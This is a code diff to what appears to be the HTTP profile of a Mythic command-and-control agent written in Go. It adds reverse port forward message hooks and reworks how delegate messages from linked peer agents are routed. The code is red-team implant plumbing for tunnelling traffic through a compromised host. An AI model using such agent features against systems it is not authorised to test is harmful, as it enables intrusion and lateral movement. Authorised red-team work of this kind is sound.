@@ -45,6 +45,10 @@ type HTTPProfile struct {
 	GetDelegatesOnly     func() []structs.DelegateMessage
 	GetDelegatesAndEdges func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
 	HandleDelegates      func(delegates []structs.DelegateMessage)
+
+	// Rpfwd hooks — set by main.go for reverse port forward message routing.
+	GetRpfwdOutbound func() []structs.SocksMsg
+	HandleRpfwd      func(msgs []structs.SocksMsg)
 }
 
 // NewHTTPProfile creates a new HTTP profile
@@ -242,6 +246,14 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 		}
 	}
 
+	// Collect rpfwd outbound messages
+	if h.GetRpfwdOutbound != nil {
+		rpfwdMsgs := h.GetRpfwdOutbound()
+		if len(rpfwdMsgs) > 0 {
+			taskingMsg.Rpfwd = rpfwdMsgs
+		}
+	}
+
 	body, err := json.Marshal(taskingMsg)
 	if err != nil {
 		return nil, nil, fmt.Errorf("failed to marshal tasking message: %w", err)
@@ -339,6 +351,18 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 		if socksRaw, err := json.Marshal(socksList); err == nil {
 			if err := json.Unmarshal(socksRaw, &inboundSocks); err != nil {
 				log.Printf("Warning: failed to parse SOCKS messages: %v", err)
+			}
+		}
+	}
+
+	// Route rpfwd messages from Mythic to the rpfwd manager
+	if h.HandleRpfwd != nil {
+		if rpfwdList, exists := taskResponse["rpfwd"]; exists {
+			if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
+				var rpfwdMsgs []structs.SocksMsg
+				if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
+					h.HandleRpfwd(rpfwdMsgs)
+				}
 			}
 		}
 	}
@@ -466,6 +490,14 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 		Socks:     socks,
 	}
 
+	// Collect rpfwd outbound messages
+	if h.GetRpfwdOutbound != nil {
+		rpfwdMsgs := h.GetRpfwdOutbound()
+		if len(rpfwdMsgs) > 0 {
+			responseMsg.Rpfwd = rpfwdMsgs
+		}
+	}
+
 	// Collect delegate messages and edge notifications from linked P2P children
 	if h.GetDelegatesAndEdges != nil {
 		delegates, edges := h.GetDelegatesAndEdges()
@@ -533,15 +565,29 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 		decryptedData = respBody
 	}
 
-	// Route any delegate responses from Mythic to linked P2P children
-	if h.HandleDelegates != nil && len(decryptedData) > 0 {
+	// Route any PostResponse data (delegates, rpfwd) from Mythic
+	if len(decryptedData) > 0 {
 		var postRespData map[string]interface{}
 		if err := json.Unmarshal(decryptedData, &postRespData); err == nil {
-			if delegateList, exists := postRespData["delegates"]; exists {
-				if delegateRaw, err := json.Marshal(delegateList); err == nil {
-					var delegates []structs.DelegateMessage
-					if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
-						h.HandleDelegates(delegates)
+			// Route rpfwd messages
+			if h.HandleRpfwd != nil {
+				if rpfwdList, exists := postRespData["rpfwd"]; exists {
+					if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
+						var rpfwdMsgs []structs.SocksMsg
+						if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
+							h.HandleRpfwd(rpfwdMsgs)
+						}
+					}
+				}
+			}
+			// Route delegate messages
+			if h.HandleDelegates != nil {
+				if delegateList, exists := postRespData["delegates"]; exists {
+					if delegateRaw, err := json.Marshal(delegateList); err == nil {
+						var delegates []structs.DelegateMessage
+						if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
+							h.HandleDelegates(delegates)
+						}
 					}
 				}
 			}
